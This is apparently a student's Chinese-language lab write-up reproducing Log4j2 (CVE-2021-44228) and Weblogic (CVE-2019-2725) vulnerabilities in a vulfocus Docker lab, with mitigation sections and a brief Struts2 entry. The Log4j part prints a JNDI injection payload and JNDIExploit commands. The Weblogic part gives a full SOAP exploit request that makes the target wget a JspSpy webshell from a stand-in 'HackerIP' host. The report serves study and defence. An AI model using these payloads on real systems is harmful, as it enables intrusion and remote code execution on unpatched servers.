# 2023网络安全团队攻防实践
## 前期准备
<sub>（进行准备的时候一时大意忘记截图了，补了一部分示意</sub>

### 基础环境准备
使用virtualbox多重加载镜像创建基础OS，给虚拟机配备多重加载并配置好两块网卡
![](/img/kali.png)
查看缺省配置情况，检查DHCP配置
### 纯净kali首次启动后配置
#### 缺省情况下的一些配置 
缺省的情况下用户名和密码都为kali，登录
缺省的时候可能有一块网卡没有分配到地址，用`ip a`进行查看
图
使用``` sudo vim /etc/network/interfaces ```进入配置修改配置文件，再输入下方代码启用网卡
```
allow-hotplug eth0
iface eth0 inet dhcp

allow-hotplug eth1
iface eth1 inet dhcp
```

```
sudo ifdown eth{0,1} && ifup eth{0,1}
```
缺省情况下kali没有开启ssh服务，需要进行一些设置,首先设置开机自启动
```
sudo systemctl enable ssh
```
第一次设置完需要手动启动一下这个服务
```
sudo systemctl start ssh
```
用`ps aux | grep ssh`进行验证

确认好之后，此时再用宿主机进行连接
```
ssh kali@192.168.56.101
```
#### ssh免密登录配置
输入以下指令进行免密登录配置
```
ssh-copy-id -i ~/.ssh/id_rsa.pub kali@192.168.56.101

```
#### 多重加载镜像制作
依次输入以下指令重置machine-id
>[为什么需要重置machine-id](https://c4pr1c3.github.io/LinuxSysAdmin/cloud-init.md.html#/why-reset-machine-id)
```
ls /etc/machine-id

cat /etc/machine-id

ls /var/lib/dbus/machine-id

cat /var/lib/dbus/machine-id
```
最后重启确保生效
### 安装docker和拉取镜像
根据老师给的[上手指南](https://github.com/c4pr1c3/ctf-games/tree/master/fofapro/vulfocus)进行操作


```
#首先把仓库克隆下来
git clone https://github.com/c4pr1c3/ctf-games.git

#进入ctf-games/fofapro目录

cd ctf-games/fofapro

#更新kali自带的镜像源然后安装docker

sudo apt update && sudo apt install -y docker.io docker-compose jq

# 将当前用户添加到 docker 用户组，免 sudo 执行 docker 相关指令
# 重新登录 shell 生效
sudo usermod -a -G docker ${USER}

# 切换到 root 用户
sudo su -

# 使用中科大 Docker Hub 镜像源
cat <<EOF > /etc/docker/daemon.json
{
  "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn/"]
}
EOF

# 重启 docker 守护进程
systemctl restart docker

# 提前拉取 vulfocus 镜像
docker pull vulfocus/vulfocus:latest

#退出root用户权限，退出kali,使权限生效
exit

ssh kali@092.168.56.101

```
### 快速上手vulfocus
进入vulfocus目录`cd ctf-games/fofapro/vulfocus`
再使用`bash start.sh`，并选择对外提供访问 vulfocus-web 的 IP
![](/img/startvulfocus.png)
打开浏览器访问 admin / admin
【镜像管理】-【镜像管理】-【一键同步】，搜索感兴趣的漏洞镜像-【下载】
镜像下载完毕后，【首页】，随时可以【启动】镜像开始漏洞攻防实验了
![](/img/vulfoucs1.png)

## 实验过程
### Log4j2（CVE-2021-44228）漏洞 
- 漏洞简介
零日漏洞利用会影响流行的 Apache Log4j 实用工具 (CVE-2021-44228)，于 2021 年 12 月 9 日该漏洞被发现，该漏洞会导致远程代码执行 (RCE)。
#### 进入访问入口
使用vulfocus里的镜像进行漏洞复现，首先下载该镜像，然后启动环境
![](/img/logmirror1.png)
打开浏览器，访问它显示的地址
![](/img/logpath1.png)

#### 检测漏洞存在性
查看容器名称
```
docker ps
```
![](/img/logdocker.png)
可以发现容器名称为 `competent_telsa`，进入容器，发现容器目录下有 `demo.jar` 文件
```
docker exec -it <容器名> bash
 ls
```
![](/img/logdocker2.png)
将该文件拉去到容器的宿主机上
```
#拉取文件
sudo docker cp <容器名称或ID>:<容器内文件路径> <宿主机目标路径>
#查看是否拉取完成
ls
```
![](/img/logpull.png)
使用jadx反编译`demo.jar`，发现有 `Log4j2RceApplic` 类，验证了该漏洞存在
![](/img/logjadx.png)

#### 验证漏洞可利用性
访问`http://dnslog.cn/` ，获取子域名
![](/img/logdns.png)
这个时候不知道为什么网站访问失败，一番排查过后发现是镜像消失了，只能再启动一个，又获得一个新的端口
![](/img/logmirror2.png)
用burp适配的浏览器访问`192.168.56.101:20717/hello?payload=111` ，返回burp查看抓到的包
```
#ldap://dnslog获取的随机域名/随便填
payload=${jndi:ldap://kw511z.dnslog.cn/exp}
```
把包送到repeater，在repeater界面进行修改
不过注意要把payload进行url编码
![](/img/logburp.png)
成功收获解析记录
![](/img/logdns2.png)
#### 漏洞利用
攻击者主机attacker上下载JNDIExploit工具

```
#下载
git clone https://github.com/bkfish/Apache-Log4j-Learning.git
#解压
unzip JNDIExploit.v1.2.zip
```
攻击者主机 attacker 启动 7777 端口
```
nc -l -p 7777
```
使用./tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
```
#vps IP 假设为 10.10.10.10 
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A 10.10.10.10
```
```
[root@VM_0_16_centos ~]# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping xx.24b5010c.dns.1433.eu.org" -A 10.10.10.10
[ADDRESS] >> 10.10.10.10
[COMMAND] >> ping xx.24b5010c.dns.1433.eu.org
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://10.10.10.10:1099/1ovanh
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.10.10.10:1099/kavkt9
ldap://10.10.10.10:1389/kavkt9
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.10.10.10:1099/m5m8wo
ldap://10.10.10.10:1389/m5m8wo
```

#### 漏洞缓释
- 使用 Log4j 的任何人士都应该尽快更新到版本 2.15.0。最新版本已可在 [Log4j 下载页面](https://logging.apache.org/log4j/2.x/download.html)中下载。
- 如果无法更新到最新版本，可以从 classpath 删除 JndiLookup 类来缓解该漏洞。此外，在不低于 2.10 的 Log4j 版本上，将系统属性 `log4j2.formatMsgNoLookups` 或 `LOG4J_FORMAT_MSG_NO_LOOKUPS` 环境变量设置为 true 可以缓解该问题。
- 使用 Cloudflare WAF 的客户还可以利用三条新部署的规则来帮助缓解任何漏洞被利用的风险
- 关于该漏洞的更多详情可在[官方 Log4j 安全性页面](https://logging.apache.org/log4j/2.x/security.html)上找到

### Weblogic反序列化远程命令执行（CVE-2019-2725）漏洞
* 漏洞简介
cve-2019-2725漏洞的核心利用点是weblogic的xmldecoder反序列化漏洞，攻击步骤就是将WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP 请求，在未授权的情况下远程执行命令，获得目标服务器的权限。
* 影响版本
Oracle WebLogic Server，版本 10.3.6.0、12.1.3.0
#### 场景搭建
由于官网已经不再提供下载和资源镜像分享，因此我们需要自己去设计构建相应的拓扑场景和镜像
首先创建两张网卡并下载好需要的 3 种漏洞镜像（`struts2-cve-2020-17530`、`weblogic-cve-2019-2725`、`nginx-php-flag`）
![](/img/dmznet.png)
再打开【场景管理】进行环境编排，先拉出container和network放在自己想要的位置，再连起来，最后点击相应模块就选择对应网卡和镜像填入，环境就搭建完成啦
![](/img/kwdscene.png)
接着进行一下burp的代理设置
![](/img/burpset1.png)
![](/img/burpset2.png)

#### 漏洞复现
使用vulfocus里的镜像进行漏洞复现，首先下载该镜像，然后启动环境
![](/img/webmirror.png)
扫描端口扫描到了7001端口开放，于是我们先访问一下7001端口：
![](/img/web7001.png)
有weblogic的错报信息，说明网站有weblogic服务，经过查询发现可以访问以下路径判断有没有该漏洞：
`/_async/AsyncResponseService`
访问发现页面如下
![](/img/webpath1.png)
接着访问`_async`，出现以下界面，说明存在漏洞
![](/img/webpath2.png)
本来在网上找到了漏洞复现的教程，接下来的几步是用burp抓包然后发送POC，结果发送一直不成功，试了很多解决方法无果，仔细观察教程之后发现它标题虽然写着Weblogic反序列化漏洞（CVE-2019-2725），结果实际上是CVE-2017-10271，事实证明csdn的教程确实不怎么值得相信...
之后就是在github上搜索与该漏洞相关的一些脚本，但是试了两个之后都不成功，还出现了让我难以理解的报错
![](/img/weberror1.png)
![](/img/weberror2.png)
仔细阅读脚本说明，多次尝试之后无果，心态有点炸裂，最后还是换了另一个复现教程
查看网站路径
`http://192.168.56.101:44913/_async/AsyncResponseService?info`
![](/img/seepath3.png)
在本机中开启简易http服务器
```
python3 -m http.server 8000
```
![](/img/http.png)
接着使用burp进行抓包，发送数据包，使服务下载木马文件
```
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.132.144:58832
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjM1MjA5NjEyLCJlbWFpbCI6IiJ9.cTSjCtV8thEmdfyP49gCsHldvX6KAAMjGQ209TCg0K8; JSESSIONID=050455BA3767B12181C6AA3E09AA3064
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 854
SOAPAction:
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>wget http://HackerIP:8000/JspSpy.jsp.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/2.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
![](/img/webburp.png)
可以发现服务器从攻击者主机成功下载脚本
![](/img/webdona.png)
接着查看服务器中脚本文件
```
docker exec -it 2f54c874f35b bash
cd user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war
```
![](/img/websucces.png)


#### 漏洞缓释
- 升级或安装补丁
及时打上官方CVE-2019-2725补丁包，官方已于4月26日公布紧急补丁包。Oracle通常会发布安全补丁来修复漏洞，包括CVE-2019-2725。访问Oracle官方网站或技术支持渠道，查找有关CVE-2019-2725的安全补丁和建议。
- 升级本地JDK版本
因为Weblogic所采用的是其安装文件中默认1.6版本的JDK文件，属于存在反序列化漏洞的JDK版本，因此升级到JDK7u21以上版本可以避免由于Java原生类反序列化漏洞造成的远程代码执行。升级JAVA版本到JDK7u21以上版本可以避免由于Java原生类反序列化漏洞造成的远程代码执行。
- 关闭受影响的组件
如果您不需要使用Oracle WebLogic Server中的某些组件或功能，可以考虑关闭它们，从而减少潜在的攻击面。这样可以降低攻击者利用漏洞的可能性。删除wls9_async_response.war与wls-wsat.war文件及相关数据,因为该漏洞由WAR包的缺陷引起，删除可以缓解，不过需要备份一下。删除wls9_async_response.war与wls-wsat.war文件及相关文件夹，并重启Weblogic服务。
- 加强网络安全措施
确保在使用Oracle WebLogic Server时采取适当的网络安全措施。这包括使用防火墙、入侵检测系统 (IDS) 和入侵防御系统 (IPS) 以及合理的访问控制策略等，以防止未经授权的访问和攻击。部署于公网的WebLogic服务器，可通过ACL禁止对/_async/及/wls-wsat/路径的访问。修改访问控制策略，限制对/_async/及/wls-wsat/路径的访问，这样就上传不了攻击木马了。
- 审查和更新代码：检查您的应用程序和自定义代码，确保没有容易受到远程代码执行攻击的漏洞。修复任何已知的安全问题，并始终保持代码库的最新状态。
- 定期更新和监控漏洞信息
保持对CVE-2019-2725和其他安全漏洞的关注，并定期更新系统和软件以获取最新的安全修复。订阅安全公告、参考安全论坛和漏洞数据库等专业资源，以获取及时的安全信息。

注：wls9_async_response.war及wls-wsat.war属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle官方不建议对其进行此类操作。若在直接删除此包的情况下应用出现问题，将无法得到Oracle产品部门的技术支持。请用户自行进行影响评估，并对此文件进行备份后，再执行此操作。

### CVE-2020-17530 Struts2
- 漏洞简介
CVE-2020-17530是关于Apache Tomcat的一个已知安全漏洞，该漏洞可能允许攻击者通过精心构造的HTTP请求执行任意代码。Struts2 会对某些标签属性(比如 `id`，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 `%{x}` 且 `x` 的值用户可控时，用户再传入一个 `%{payload}` 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。
#### 漏洞缓释
- 避免对不受信任的用户输入使用强制OGNL评估，或/和升级到2.5.26版，可修复该漏洞。腾讯安全专家建议受影响的用户将Apache Struts框架升级至最新版本
- 临时修复，升级到 Struts 2.5.26 版本

### 参考资料
- https://c4pr1c3.github.io/cuc-ns-ppt/
- https://github.com/lasensio/cve-2019-2725/tree/master
- https://github.com/pimps/CVE-2019-2725
- https://www.cnblogs.com/confidant/p/15464877.html#gallery-6
- https://blog.csdn.net/Q0717168/article/details/118035672
- https://help.aliyun.com/noticelist/articleid/1060011544.html
- https://www.exploit-db.com/exploits/46780